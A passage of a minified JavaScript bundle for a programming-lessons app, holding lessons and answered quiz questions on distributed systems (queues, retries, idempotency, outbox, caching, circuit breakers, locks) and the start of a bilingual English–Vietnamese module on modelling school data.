pipefail`",meaning:"Make a bash script stop at the first error"},{term:"`tail -f`",meaning:"Keep printing new lines of a log file"}]},{title:"Config and containers",items:[{term:"Environment",meaning:"One place the app runs: dev, test, staging, production"},{term:"Build once",meaning:"Same build everywhere; only the config changes"},{term:"Image",meaning:"Read-only package: app + runtime + libraries"},{term:"Container",meaning:"A running copy of an image; can be thrown away any time"},{term:"Layer cache",meaning:"Unchanged steps are reused; put rarely changing steps first"},{term:"Volume",meaning:"Storage outside the container; survives a redeploy"}]},{title:"Pipelines and deploys",items:[{term:"CI",meaning:"Every push is built and tested automatically"},{term:"Continuous delivery",meaning:"Every green build is ready; a person clicks release"},{term:"Continuous deployment",meaning:"Every green build goes live automatically"},{term:"Artifact",meaning:"Build output (zip, package, image) that you promote"},{term:"Rolling",meaning:"Replace servers one by one; v1 and v2 run together"},{term:"Blue-green",meaning:"Two full copies; switch traffic, switch back fast"},{term:"Canary",meaning:"A small share of users first; watch errors, then grow"},{term:"Feature flag",meaning:"Turn a feature on or off without a deploy"}]},{title:"Database changes",items:[{term:"Expand",meaning:"Add the new column next to the old one; old code still works"},{term:"Backfill",meaning:"Copy old data into the new column in small batches"},{term:"Contract",meaning:"Remove the old column in a later release"},{term:"Never in one step",meaning:"Rename or drop a column that running code still uses"}]},{title:"Cloud",items:[{term:"IaaS",meaning:"You rent a VM; you manage the OS, runtime and app"},{term:"PaaS",meaning:"You manage the app and config; the platform runs the rest"},{term:"Serverless",meaning:"Code runs per event; pay per run; watch cold starts"},{term:"SaaS",meaning:"A finished app that you just use"},{term:"Zone",meaning:"Separate data center(s) in a region; spread servers across them"},{term:"Egress",meaning:"Data leaving the cloud; usually charged per GB"}]}]},O=Object.freeze(Object.defineProperty({__proto__:null,default:P},Symbol.toStringTag,{value:"Module"})),N={id:"distributed-systems",title:"Distributed Systems",emoji:"🌍",tagline:"Queues, retries, duplicates — when the network lies",lessons:[{id:"distributed-systems.queues",title:"Message queues and events",summary:"Do the slow work later, somewhere else.",minutes:3,blocks:[{type:"text",text:"A **message queue** is a to-do list between services. A **producer** puts a message in. A **consumer** (worker) takes it out and processes it later."},{type:"diagram",text:`API ──► [ queue: msg msg msg ] ──► Worker
 "OrderPlaced"                   sends email,
 returns 200 fast                makes invoice`},{type:"list",items:["**Decouple** (depend less on each other) — the API keeps working even if the email service is down. The message waits.","**Handle spikes** (sudden peaks of traffic) — 10,000 orders in one minute? The queue grows, and workers finish the work a bit later.","**Scale** — add more workers to process faster."]},{type:"compare",left:{title:"Command",items:['"Do this": `SendInvoice`',"One handler","Sender expects it to happen"]},right:{title:"Event",items:['"This happened": `OrderPlaced`',"Zero, one or many listeners","Sender does not know who reacts"]}},{type:"text",text:"A consumer **acknowledges** (acks) a message when it is done. Until the ack, the queue keeps the message. If the worker crashes, the queue gives the message to someone else."}],remember:"Queue = to-do list between services. No ack → the message comes back.",questions:[{id:"distributed-systems.queues.1",kind:"scenario",difficulty:"easy",prompt:"Checkout calls the email service directly. When the email service is down, customers **cannot place orders**. What change helps most?",choices:["Give the email service a bigger server","Put the email on a queue; a worker sends it","Retry the email call up to 100 times in checkout","Stop sending order confirmation emails"],answer:1,why:"With a queue, checkout only needs the queue to be up. The email is sent when the email service comes back. A failing side task no longer breaks the main flow.",remember:"Queues stop a slow side task from breaking the main flow."},{id:"distributed-systems.queues.2",kind:"compare",difficulty:"medium",prompt:"After an order is placed, billing, shipping and analytics all need to react. Next month a loyalty service will join. Which message design fits better?",choices:["Three commands from the order service: `CreateInvoice`, `ShipOrder`, `TrackSale`","One `OrderPlaced` event that each service subscribes to"],answer:1,why:"With an event, the order service does not need to know its listeners. Loyalty can subscribe later without changing the order service."},{id:"distributed-systems.queues.3",kind:"debug",difficulty:"medium",prompt:"One message makes the worker throw every time (bad data). The worker keeps retrying it forever, and the messages behind it are not processed. What is the usual fix?",choices:["Restart the queue server so the message is dropped","Catch the exception and ack it silently","After N tries, move it to a dead-letter queue","Add more workers so others get processed"],answer:2,why:'A "poison message" is a message that never succeeds. A dead-letter queue is a separate queue for such messages. It holds the bad message, so the others can continue. A person can check it later. Acking silently would lose it, and nobody would know.',remember:"Poison message → dead-letter queue, not an endless loop."}]},{id:"distributed-systems.retries",title:"Timeouts, retries and duplicates",summary:"The network fails in strange ways.",minutes:4,blocks:[{type:"text",text:`In one process, a method call either returns or throws. Over a network there is a third result: **"I don't know."**`},{type:"diagram",text:`You ──request──► Payment service
    ✗ timeout
Did it fail before charging?   maybe
Did it charge, then the reply was lost?   maybe`},{type:"text",text:'A **timeout** does not mean "it failed". It means "I stopped waiting". The work may have happened.'},{type:"text",text:"Queues have the same problem. Most queues give **at-least-once delivery**. Once the queue accepts a message, it delivers it one or more times, never zero times."},{type:"diagram",text:`Worker: receive msg ─► process ─► 💥 crash
                              (no ack sent)
Queue:  no ack → deliver again ─► process AGAIN`},{type:"list",items:["Always set a **timeout** on network calls. Without one, a stuck call can wait forever.","Retry only **temporary** errors (timeout, 503). A 400 Bad Request will fail again.","Use **exponential backoff + jitter**. Backoff: wait longer each time (1 s, 2 s, 4 s). Jitter: add a small random time, so clients don't all retry at the same moment.","Assume every message and every retried request can arrive **twice**."]}],remember:"Timeout = unknown result. Retries + at-least-once = duplicates.",questions:[{id:"distributed-systems.retries.1",kind:"scenario",difficulty:"easy",prompt:"Your worker receives a message, processes it, then crashes **before acknowledging it**. What might happen?",choices:["It is delivered again and processed twice","It is lost, because the worker already received it","The queue marks it done after a timeout","The queue notices the crash and rolls back the work"],answer:0,why:"The queue never got the ack, so it thinks the work was not done and redelivers it. This is at-least-once delivery. Your handler must be safe to run twice.",remember:"No ack = it comes back."},{id:"distributed-systems.retries.2",kind:"scenario",difficulty:"medium",prompt:"You call a payment API to charge $50. After 30 seconds you get a timeout. What is the safest next step?",choices:["Assume it failed and charge again with a new request","Retry using the same idempotency key as before","Assume it succeeded and ship the order","Show the user an error and forget about it"],answer:1,why:"The charge may or may not have happened. An idempotency key is a unique id for this one charge. If you retry with the same key, the provider returns the first result instead of charging twice. Checking the payment status first also works.",remember:"After a timeout, check — don't guess."},{id:"distributed-systems.retries.3",kind:"perf",difficulty:"hard",prompt:"A service is down for 10 seconds. When it comes back, a huge wave of traffic crashes it again right away. All clients retry every 1 second with no limit. What would you change?",choices:["Retry every 100 ms so clients recover faster","Remove the client timeouts so calls just wait","Always return 200 while starting up","Backoff with jitter, plus a retry limit"],answer:3,why:'Thousands of clients retrying at the same moment create a "retry storm". Backoff spreads retries over time. Jitter keeps clients from retrying at the same moment. A limit stops endless retrying.'},{id:"distributed-systems.retries.4",kind:"debug",difficulty:"medium",prompt:"The `ReportService` calls `PricingService` with no timeout. One day pricing stops responding. Soon, many report requests are waiting, and the report service runs out of memory. What is the root cause?",choices:["No timeout, so waiting requests keep growing","Pricing returns too much data","Reports are not cached, so each one is rebuilt","A memory leak in the report service JSON code"],answer:0,why:"With no timeout, every request waits on the stuck service and holds its memory and connections. A timeout lets the call fail quickly and free its resources.",remember:"Every network call needs a timeout."}]},{id:"distributed-systems.idempotency",title:"Idempotency: safe to do twice",summary:"Duplicates will happen. Make them harmless.",minutes:4,blocks:[{type:"text",text:"An operation is **idempotent** when doing it twice has the same effect as doing it once."},{type:"compare",left:{title:"Idempotent ✅",items:["`SET Status = 'Paid'`","`DELETE WHERE Id = 7`","PUT the full profile"]},right:{title:"Not idempotent ⚠️",items:["`Balance = Balance + 10`","INSERT a new payment row","Send an email"]}},{type:"text",text:"Most real handlers are not naturally idempotent. So the **consumer** remembers what it already did, using a **message id** or an **idempotency key**."},{type:"code",code:{lang:"csharp",text:`async Task Handle(PaymentReceived msg)
{
    using var tx = await db.Database.BeginTransactionAsync();
    // ProcessedMessages has a UNIQUE key on MessageId
    if (await db.ProcessedMessages.AnyAsync(
            p => p.MessageId == msg.Id))
        return;                     // seen it → skip

    var order = await db.Orders.FindAsync(msg.OrderId);
    order.AmountPaid += msg.Amount;
    db.ProcessedMessages.Add(new(msg.Id));
    await db.SaveChangesAsync();    // both or neither
    await tx.CommitAsync();
}`}},{type:"text",text:'Key detail: save the "processed" mark in the **same transaction** as the business change. The **unique key** catches the rare case where two workers get the same message at the same moment.'},{type:"example",title:"APIs too",text:"Payment APIs like Stripe accept an `Idempotency-Key` header. The client creates one key per purchase and sends the same key on every retry. The server returns the stored result instead of charging again."}],remember:"Idempotent = twice is the same as once. Dedupe (skip duplicates) by message id.",questions:[{id:"distributed-systems.idempotency.1",kind:"scenario",difficulty:"easy",prompt:"A `PointsEarned` handler runs `UPDATE Users SET Points = Points + 100`. The queue delivers the same message twice. What happens, and what is a good fix?",choices:["100 points; the queue removes duplicates for you","The second update fails; add a retry policy","200 points; skip message ids already processed","200 points; clear the queue after each message"],answer:2,why:"`+ 100` is not idempotent, so the duplicate adds points again. Storing processed message ids (with a unique key) lets the handler skip the second copy."},{id:"distributed-systems.idempotency.2",kind:"compare",difficulty:"medium",prompt:"Your handler marks a message as processed. Which approach is safer?",choices:["Save the order change and the message id in one transaction","Commit the order change, then save the message id separately"],answer:0,why:"With two transactions, a crash can happen between them. Then the order is updated, but the id is not stored. A redelivery applies the change again. One transaction (plus a unique key on the id) makes both happen together.",remember:'Mark "done" in the same transaction as the work.'},{id:"distributed-systems.idempotency.3",kind:"scenario",difficulty:"medium",prompt:"A mobile app sends `POST /orders`. On a bad network the app retries, and some customers get **two identical orders**. What is the best fix?",choices:["Turn off automatic retries in the mobile app","Block a customer from ordering twice per day","Make the server respond faster so nobody retries","Send an idempotency key per checkout attempt"],answer:3,why:"The first request probably succeeded but the response was lost. With one key per checkout, the server sees a repeated key and returns the existing order. Turning off retries only turns lost responses into failed orders."},{id:"distributed-systems.idempotency.4",kind:"debug",difficulty:"hard",prompt:"A handler checks `if (alreadyProcessed(msg.Id)) return;` and later saves the id. There is **no unique constraint** on the id. Rarely, a message is still processed twice. Why?",choices:["The `alreadyProcessed` query is too slow under load","Two workers checked before either saved the id","Message ids are not unique across producers","The queue ignores acks from this worker"],answer:1,why:"Two workers got the same message at once. Check-then-insert is a race between them. A unique constraint on the message id makes the second insert fail, so only one wins.",remember:"Let a unique constraint be the final judge."}]},{id:"distributed-systems.consistency",title:"Eventual consistency and the outbox",summary:"Data that is correct… a bit later.",minutes:4,blocks:[{type:"text",text:"**Eventual consistency** means that parts of the system may disagree for a short time. They agree again once all messages are processed."},{type:"example",title:"Example",text:'You place an order. The Orders service saves it right away. The "My orders" search page is filled by an event, 2 seconds later. For those 2 seconds, the search page does not show your new order.'},{type:"text",text:"Now a classic trap: you must **save to the database** and **publish an event**. These are two different systems. What if one succeeds and the other fails?"},{type:"diagram",text:`save order ✅ ─► publish event ❌ (broker down)
  → order exists, nobody ships it

publish event ✅ ─► save order ❌ (DB error)
  → shipping ships an order that doesn't exist`},{type:"text",text:"The **outbox pattern** fixes this. Save the event in an `Outbox` table **in the same DB transaction** as the order. A background job (the **relay**) reads the outbox and publishes the events."},{type:"diagram",text:`┌── one DB transaction ──┐
│ INSERT Orders          │
│ INSERT Outbox (event)  │
└────────────────────────┘
          │
 relay job: read Outbox ─► publish ─► mark sent`},{type:"text",text:'If the relay crashes after publishing but before "mark sent", it publishes again. So consumers still need to be **idempotent**.'}],remember:"DB + broker can't share a transaction → outbox table + idempotent consumers.",questions:[{id:"distributed-systems.consistency.1",kind:"scenario",difficulty:"medium",prompt:"Code: `await db.SaveChangesAsync(); await bus.PublishAsync(new OrderPlaced(...));`. The bus is down for 1 minute. What happens to orders saved in that minute?",choices:["Their save is rolled back automatically","The bus buffers them and sends them later","`SaveChanges` waits until the bus is back","Saved, but no event is ever sent for them"],answer:3,why:"The DB commit already happened. The publish fails afterwards, and nothing tries again. The services that listen for this event never hear about these orders.",remember:'Save + publish is a "dual write" — one can fail alone.'},{id:"distributed-systems.consistency.2",kind:"compare",difficulty:"hard",prompt:'You need "order saved" and "event published" to always match. Which design is more reliable?',choices:["Order + outbox row in one transaction; a relay publishes","Publish first, then save; if the save fails, publish `OrderCancelled`","Wrap save and publish in try/catch, log errors"],answer:0,why:"The outbox turns two writes into one DB transaction. The relay retries until the broker accepts the event. The other options can still lose events or send wrong ones if a crash happens at the wrong moment."},{id:"distributed-systems.consistency.3",kind:"debug",difficulty:"easy",prompt:'Users report: "I created a project, but it is not in the project list. After a few seconds it appears." The list is built from events. What is the most likely explanation?',choices:["The project was saved twice by a retry","The browser cached the old project list response","The list is updated a moment after the write","A database deadlock delayed the insert"],answer:2,why:"Eventual consistency: the write is done, but the event that updates the list takes a moment. A common UX fix: show the new item from the create response right away."},{id:"distributed-systems.consistency.4",kind:"scenario",difficulty:"hard",prompt:"You use the outbox pattern. The relay publishes an event, then crashes before marking the row as sent. What happens next, and what must consumers do?",choices:["The event is lost; consumers must poll","It is published again; consumers must dedupe","The DB transaction is rolled back; consumers do nothing","The broker removes the duplicate; consumers do nothing"],answer:1,why:"After restart the row still looks unsent, so it is published again. The outbox gives at-least-once publishing, not exactly-once. Consumers dedupe by event id."}]},{id:"distributed-systems.caching",title:"Caching: fast, until it lies",summary:"Stale data, invalidation and stampedes.",minutes:4,blocks:[{type:"text",text:"A cache keeps a copy of data close by, so you don't ask the database every time. The price: the copy can be **stale** (old)."},{type:"diagram",text:`Cache-aside (most common)
read:  cache hit?  ─yes─► return it
           │no
           ▼
       load from DB ─► put in cache (TTL 5 min) ─► return

write: update DB ─► delete the cache key`},{type:"list",items:["**TTL** (time to live) — the copy expires after N minutes. A safety net: stale data cannot live forever.","**Invalidation** — when data changes, delete the cached copy. It is easy to forget one place.","**Per-server memory cache** — each API instance has its own copy. Deleting it on one server does not clear the others."]},{type:"text",text:"**Cache stampede**: a very popular key expires. 1,000 requests miss the cache at the same moment. They **all** go to the database to rebuild it."},{type:"list",items:["Let only **one** request rebuild the key; others wait or get the old value.","Add random **jitter** to TTLs so many keys don't expire together.","Refresh popular keys **before** they expire."]}],remember:'Every cache needs an answer to: "how stale is OK, and who clears it?"',questions:[{id:"distributed-systems.caching.1",kind:"debug",difficulty:"medium",prompt:"You run 4 API instances, each with an in-memory cache of product prices. An admin changes a price; the code deletes the cache key. Some users still see the old price for up to 10 minutes. Why?",choices:["The database update was slow to commit","Browsers cache the price on the client","Only one instance's copy was deleted","The TTL is too short for this data"],answer:2,why:"Each instance has its own memory. Only the instance that handled the admin request cleared its copy. The other three keep the old price until their TTL expires. Use a shared cache (for example, Redis), or tell every instance to delete its copy.",remember:"In-memory cache × N servers = N copies to invalidate."},{id:"distributed-systems.caching.2",kind:"perf",difficulty:"hard",prompt:"Every hour, at exactly the same minute, the database CPU jumps to 100% for a few seconds. The home page data is cached with a fixed 60-minute TTL and is requested 2,000 times per second. What is the likely cause?",choices:["A scheduled database backup runs every hour","The hot key expires; all requests hit the DB","The home page query is missing an index on a column","Many users log in at that same minute"],answer:1,why:"A cache stampede. When the popular key expires, every request misses together and runs the same expensive query. Let one request rebuild it and serve the old value in the meantime. Or refresh the key early.",remember:"Hot key expires → stampede."},{id:"distributed-systems.caching.3",kind:"compare",difficulty:"medium",prompt:"When a product changes, what should the code do with the cached product?",choices:["Leave it; the 24-hour TTL will fix it","Update the cache first, then update the DB","Update the DB, then delete the cache key"],answer:2,why:"Deleting the key means the next read loads fresh data. Updating the cache first leaves wrong data if the DB write fails. Waiting for the TTL shows old data for up to a day."},{id:"distributed-systems.caching.4",kind:"scenario",difficulty:"medium",prompt:"The product team wants to cache the **account balance** shown before a money transfer. They want a 10-minute cache to reduce DB load. What is the main risk?",choices:["Users may approve transfers on an old balance","Caches cannot store `decimal` values safely","Redis is too slow for data read this often","A 10-minute TTL is too short to reduce DB load"],answer:0,why:"Money decisions need fresh data. Stale data is fine for a product description, not for a balance used to approve a transfer. Cache what can be a little old. Read important data fresh.",remember:'Ask "what if this is 10 minutes old?" before caching.'}]},{id:"distributed-systems.failures",title:"Cascading failures and circuit breakers",summary:"One slow service can break everything.",minutes:4,blocks:[{type:"text",text:"A **cascading failure** starts when one service gets slow. Its callers wait, and their waiting requests grow. Then **they** fail too, and so on up the chain."},{type:"diagram",text:`Web ──► Orders ──► Inventory (slow 🐢)
             │ waiting... waiting...
             ▼
   Orders: all threads / connections busy
             ▼
   Web: Orders times out → whole site down`},{type:"text",text:"A **circuit breaker** stops calling a service that keeps failing. Like the fuse in your house."},{type:"diagram",text:`CLOSED ──(too many failures)──► OPEN
  ▲   calls go through         fail fast, no call
  │                                  │ after 30 s
  └──(test call OK)── HALF-OPEN ◄────┘
                      let 1 test call through`},{type:"list",items:["**Timeouts** — stop waiting on a slow call.","**Circuit breaker** — stop calling a broken service for a while; give it time to recover.",'**Fallback** — return something useful: cached data, a default, "try later".',"**Bulkhead** — separate resource pools, like the walls inside a ship. One bad dependency cannot use all threads."]},{type:"text",text:"In .NET, Polly (or `Microsoft.Extensions.Http.Resilience`) gives you timeouts, retries and circuit breakers for `HttpClient`."}],remember:"Failing fast is better than waiting forever. Timeouts + circuit breaker + fallback.",questions:[{id:"distributed-systems.failures.1",kind:"scenario",difficulty:"medium",prompt:"The product page calls a recommendations service. It has been failing for 2 minutes and each call takes 10 s to time out. Product pages now take 10 s too. What should happen?",choices:["Raise the timeout to 60 s so calls can finish","Retry each failed call 5 times before giving up","Open a circuit breaker and skip recommendations","Keep calling it every time — it might come back"],answer:2,why:"Recommendations are optional. An open circuit fails fast instead of waiting 10 s each time, and the page shows without them. Retrying or waiting longer makes it worse.",remember:"Optional dependency down → fail fast and show the page without it."},{id:"distributed-systems.failures.2",kind:"mcq",difficulty:"easy",prompt:"What does a circuit breaker in the **half-open** state do?",choices:["Blocks all calls forever","Sends every call twice to be safe","Replays all calls that failed before","Lets a few test calls through"],answer:3,why:"After the open period, half-open lets a little traffic through to check if the service has recovered. Success closes the circuit; failure opens it again."},{id:"distributed-systems.failures.3",kind:"debug",difficulty:"hard",prompt:"Your API calls two services: Payments and Avatars, using one shared `HttpClient` connection pool. Avatars becomes very slow. Soon **payments** also time out, even though Payments is healthy. Why?",choices:["Slow Avatar calls use up the shared pool","Payments secretly depends on Avatars internally","Payments is rate-limiting you","`HttpClient` can only call one host at a time"],answer:0,why:"Slow calls hold connections and threads. If both share the same limited resources, one bad dependency takes them all from the other. Separate pools (bulkheads) and short timeouts limit the damage.",remember:"Keep dependencies apart, so one can't sink the whole ship."}]},{id:"distributed-systems.locks",title:"Distributed locks",summary:"When `lock` is not enough.",minutes:3,blocks:[{type:"text",text:"C#'s `lock` only works **inside one process**. When your app runs on 3 servers, each server has its own lock. They don't see each other."},{type:"diagram",text:`Server 1: lock ✅ ─► run "send invoices"
Server 2: lock ✅ ─► run "send invoices"
Server 3: lock ✅ ─► run "send invoices"
        → customers get 3 invoices`},{type:"text",text:"A **distributed lock** lives in a shared place: Redis, a database row, or a blob lease. Only one server can hold it."},{type:"text",text:"Distributed locks have a **lease** (an expiry time), so a crashed server does not hold the lock forever. But this creates a trap. The holder may be slower than the lease (long GC pause, slow network). Then the lock expires, and a **second** server takes it. Now two servers think they own it."},{type:"list",items:["Prefer a **database guarantee** when you can: a unique constraint, or `UPDATE ... WHERE Status = 'Pending'` and check the row count.","Use a distributed lock to **avoid duplicate work**, but keep the work idempotent in case two run anyway.","Pick a lease clearly longer than the job, or renew it while working."]}],remember:"Many servers → `lock` does nothing. Prefer DB guarantees; locks can expire.",questions:[{id:"distributed-systems.locks.1",kind:"scenario",difficulty:"easy",prompt:"A nightly job is a hosted service in your API. You scale the API from 1 to 3 instances. The next morning, customers have **3 copies** of their invoice. Why?",choices:["The queue duplicated the invoice messages","The database replicated the invoice rows","Each instance ran its own copy of the job","The email provider retried each send 3 times"],answer:2,why:'Each instance runs the same background service. Make sure only one runs it: a distributed lock, a separate single scheduler, or "claim" rows in the DB first.',remember:"Scaling out to N instances = every background job runs N times."},{id:"distributed-systems.locks.2",kind:"compare",difficulty:"medium",prompt:"Two workers may try to ship the same order. Which approach is more reliable?\nThe conditional update is `UPDATE Orders SET Status = 'Shipping' WHERE Id = @id AND Status = 'Paid'`.",choices:["The conditional update; ship only if 1 row changed","A `static` lock object and `lock` around the shipping method"],answer:0,why:"Workers usually run in different processes, so a C# `lock` does not stop them. The conditional update is atomic in the database: only one worker can change the row.",remember:"Let the database decide who wins."},{id:"distributed-systems.locks.3",kind:"debug",difficulty:"hard",prompt:"A job takes a Redis lock with a **30-second** expiry, then runs an import. Usually the import takes 10 s, but on big days it takes 90 s. On those days the data is imported twice. Why?",choices:["Redis restarted and forgot the lock on big days","The lock expired; another instance took it","Redis does not support expiring locks","The import has a retry loop that runs it twice"],answer:1,why:"The lease ran out while the first job was still working. A second instance saw a free lock and started too. Renew the lease while working, set it well above the worst case, and make the import idempotent.",remember:"A lock with expiry can expire while you still need it."}]}],cheatSheet:[{title:"Messaging",items:[{term:"Queue",meaning:"To-do list between services; consumer acks when done"},{term:"Event vs command",meaning:'"This happened" (many listeners) vs "do this" (one handler)'},{term:"At-least-once",meaning:"Message may arrive twice — no ack → redelivered"},{term:"Dead-letter queue",meaning:"Where poison messages go after N failed tries"},{term:"Outbox",meaning:"Save event in DB with the data; a relay publishes it later"}]},{title:"Failures",items:[{term:"Timeout",meaning:"Result unknown — it may have succeeded"},{term:"Retry",meaning:"Only temporary errors; exponential backoff + jitter + max tries"},{term:"Idempotency key",meaning:"Same key on retry → server returns first result, no double work"},{term:"Idempotent consumer",meaning:"Store processed message ids, unique key, same transaction"},{term:"Cascading failure",meaning:"Slow service → callers wait → they fail too"},{term:"Circuit breaker",meaning:"Closed → open (fail fast) → half-open (test) → closed"},{term:"Bulkhead",meaning:"Separate pools so one dependency can't use all resources"}]},{title:"Data",items:[{term:"Eventual consistency",meaning:"Parts disagree for a moment, then agree again"},{term:"Cache-aside",meaning:"Miss → load DB → store with TTL; on write delete the key"},{term:"Stale data",meaning:"Cached copy older than the DB — decide how old is OK"},{term:"Cache stampede",meaning:"Hot key expires → everyone hits the DB; rebuild once"},{term:"Distributed lock",meaning:"Shared lock (Redis/DB) with a lease; can expire during the work"}]}]},q=Object.freeze(Object.defineProperty({__proto__:null,default:N},Symbol.toStringTag,{value:"Module"})),D={id:"education",group:"domain",title:"Education & Schools",emoji:"🎓",tagline:`Students, classes, grades and fees: the school as a system.
VI: Học sinh, lớp học, điểm số và học phí: nhà trường nhìn như một hệ thống.`,lessons:[{id:"education.structure",title:"The school structure · Cơ cấu nhà trường",summary:`School year, semester, class, subject, teacher and student, and how they link.
VI: Năm học, học kỳ, lớp, môn học, giáo viên, học sinh và cách chúng liên kết với nhau.`,minutes:4,blocks:[{type:"text",text:`A school system is built on a few core **entities** (things you store as tables). The **school year** splits into **semesters**. Each **class** belongs to one **grade level** in one school year.
VI: Hệ thống trường học dựa trên vài **thực thể** chính (những thứ được lưu thành bảng). **Năm học** chia thành các **học kỳ**. Mỗi **lớp** thuộc một **khối** trong một năm học.`},{type:"diagram",text:`SchoolYear 2025-2026
   │ 1..n
   ▼
Semester (HK1, HK2)

GradeLevel 10 ──► Class 10A1 (2025-2026)
                    │            │
           homeroom │            │ members
                    ▼            ▼
                 Teacher   ClassEnrollment
                                 │
                                 ▼
                              Student

TeachingAssignment =
  Teacher + Class + Subject + Semester`},{type:"text",text:`Class 10A1 in 2025–2026 is not the same row as 10A1 in 2026–2027. It has other students and another **homeroom teacher** (the main teacher in charge of the class).
VI: Lớp 10A1 năm 2025–2026 không phải cùng một dòng với lớp 10A1 năm 2026–2027. Lớp có học sinh khác và **giáo viên chủ nhiệm** khác.`},{type:"text",text:`A **teaching assignment** says who teaches which subject to which class in which semester. Timetables, grade entry and access rights all read it.
VI: **Phân công giảng dạy** cho biết ai dạy môn gì, cho lớp nào, trong học kỳ nào. Thời khóa biểu, nhập điểm và phân quyền đều đọc dữ liệu này.`},{type:"example",title:"Moving to another class",text:"In November, An moves from 10A1 to 10A3. The system just updates `Student.ClassId`. Now An is missing from the 10A1 lists for September and October. Old attendance reports for 10A1 change.\nVI: Tháng 11, An chuyển từ lớp 10A1 sang 10A3. Hệ thống chỉ sửa cột `Student.ClassId`. Giờ An biến mất khỏi danh sách lớp 10A1 của tháng 9 và tháng 10. Báo cáo chuyên cần cũ của lớp 10A1 bị thay đổi."},{type:"diagram",text:`ClassEnrollment, student An
┌───────┬────────────┬────────────┐
│ Class │ FromDate   │ ToDate     │
├───────┼────────────┼────────────┤
│ 10A1  │ 2025-09-05 │ 2025-11-09 │
│ 10A3  │ 2025-11-10 │ (open)     │
└───────┴────────────┴────────────┘`},{type:"code",code:{lang:"sql",text:`-- Students in class @c on date @d
SELECT s.Code, s.FullName
FROM ClassEnrollment e
JOIN Student s ON s.Id = e.StudentId
WHERE e.ClassId = @c
  AND e.FromDate <= @d
  AND (e.ToDate IS NULL OR e.ToDate >= @d);`}},{type:"list",items:["Ask: when a student changes class, do the grades so far move with the student?","Ask: can one teacher be the homeroom teacher of two classes at once?","Ask: does the student code stay the same for all years at this school?","Ask: what happens to a student who repeats a grade level?"]}],remember:`Classes belong to a school year, and students move. Store class membership with dates, not in one column.
VI: Lớp gắn với năm học, còn học sinh có thể chuyển lớp. Hãy lưu việc học sinh thuộc lớp nào kèm ngày hiệu lực, không dùng một cột.`,questions:[{id:"education.structure.1",kind:"mcq",difficulty:"easy",prompt:"Why should the `Class` table have a `SchoolYearId` column?\nVI: Vì sao bảng `Class` nên có cột `SchoolYearId`?",choices:["The same class name, like 10A1, comes back every year","It makes class names shorter for staff to type","Teachers can only work for one school year","Fees are always paid once per school year"],answer:0,why:`10A1 this year and 10A1 next year are different groups of students. Without the year, their data mixes together.
VI: Lớp 10A1 năm nay và 10A1 năm sau là hai nhóm học sinh khác nhau. Không có năm học, dữ liệu của chúng bị trộn lẫn.`},{id:"education.structure.2",kind:"debug",difficulty:"medium",prompt:`An moved from 10A1 to 10A3 in November. Now the October report for 10A1 shows one student fewer. No rows were deleted. What is the most likely cause?
VI: An chuyển từ 10A1 sang 10A3 vào tháng 11. Giờ báo cáo tháng 10 của lớp 10A1 thiếu một học sinh. Không dòng nào bị xóa. Nguyên nhân có khả năng nhất là gì?`,choices:["The report reads each student’s current ClassId","The attendance table lost its October rows","The report cache was not cleared after the move","An has two different student codes"],answer:0,why:`If class is one column, old reports use today’s value. A class enrollment table with dates keeps An in 10A1 for October.
VI: Nếu lớp chỉ là một cột, báo cáo cũ sẽ dùng giá trị hiện tại. Bảng xếp lớp có ngày hiệu lực giữ An ở lớp 10A1 trong tháng 10.`},{id:"education.structure.3",kind:"scenario",difficulty:"medium",prompt:`Teachers may enter grades only for the classes and subjects they teach. Which data should the system check?
VI: Giáo viên chỉ được nhập điểm cho lớp và môn mình dạy. Hệ thống nên kiểm tra dữ liệu nào?`,choices:["Teaching assignment for that class and subject","The homeroom teacher field on that class","The teacher’s department in the HR system","Any class in the same grade level as hers"],answer:0,why:`The teaching assignment links teacher, class, subject and semester. The homeroom teacher usually teaches only one or two subjects of the class.
VI: Phân công giảng dạy liên kết giáo viên, lớp, môn và học kỳ. Giáo viên chủ nhiệm thường chỉ dạy một hai môn của lớp đó.`},{id:"education.structure.4",kind:"truefalse",difficulty:"easy",prompt:`When a student moves class mid-year, the grades already entered should be deleted and typed again in the new class.
VI: Khi học sinh chuyển lớp giữa năm, điểm đã nhập nên bị xóa và nhập lại ở lớp mới.`,choices:["True","False"],answer:1,why:`Grades usually belong to the student, subject and semester, so they follow the student. Deleting them loses history. Still, confirm the rule with the school.
VI: Điểm thường gắn với học sinh, môn học và học kỳ, nên đi theo học sinh. Xóa đi sẽ mất lịch sử. Tuy vậy, vẫn nên xác nhận quy định với nhà trường.`}]},{id:"education.admission",title:"Admission and enrollment · Tuyển sinh và nhập học",summary:`From application to enrolled student, and from student to a seat in a course.
VI: Từ hồ sơ đăng ký đến học sinh nhập học, và từ sinh viên đến một chỗ trong lớp học phần.`,minutes:5,blocks:[{type:"text",text:`An **application** is a request to join the school. It is not a student yet. It moves through **statuses** until the person is **enrolled** (officially a student).
VI: **Hồ sơ đăng ký** là yêu cầu được vào học. Nó chưa phải là học sinh. Hồ sơ đi qua các **trạng thái** cho đến khi người đó **nhập học** (chính thức là học sinh).`},{type:"diagram",text:`Submitted
   │
   ▼
UnderReview ──► Rejected
   │
   ├──► Waitlisted ──┐ a seat frees up
   │                 │
   ▼                 │
Admitted ◄───────────┘
   │ confirms, pays deposit
   ▼
Enrolled ──► Student record created

Before Enrolled, any status
can go to ──► Withdrawn`},{type:"text",text:`A **quota** is the number of seats, for example 450 places in grade 10. When it is full, good applicants go to the **waitlist**. That is a ranked queue for seats that free up later.
VI: **Chỉ tiêu** là số chỗ, ví dụ 450 chỗ cho lớp 10. Khi đủ chỉ tiêu, hồ sơ đạt yêu cầu vào **danh sách chờ**. Đó là hàng chờ xếp thứ tự cho những chỗ trống về sau.`},{type:"example",title:"One child, two applications",text:`A parent applies online, then again at the school office with another phone number. Now one child has two applications and may take two seats. Match on the child’s ID number and birth date, not the phone.
VI: Phụ huynh nộp hồ sơ online, rồi nộp lại tại văn phòng trường với số điện thoại khác. Một em có hai hồ sơ và có thể chiếm hai chỗ. Hãy so khớp theo mã định danh và ngày sinh của trẻ, không theo số điện thoại.`},{type:"text",text:`At a university, students **register for courses** each semester. Each **course section** has a capacity. A course may have a **prerequisite**: another course the student must pass first.
VI: Ở đại học, sinh viên **đăng ký học phần** mỗi học kỳ. Mỗi **lớp học phần** có sĩ số tối đa. Một học phần có thể có **học phần tiên quyết**: môn sinh viên phải đạt trước.`},{type:"diagram",text:`Section capacity 40, Enrolled = 39
 Student A           Student B
 read 39 → ok        read 39 → ok
 write 40            write 40
          │
          ▼
 41 registrations, but Enrolled = 40`},{type:"code",code:{lang:"sql",text:`-- Take one seat only if one is left
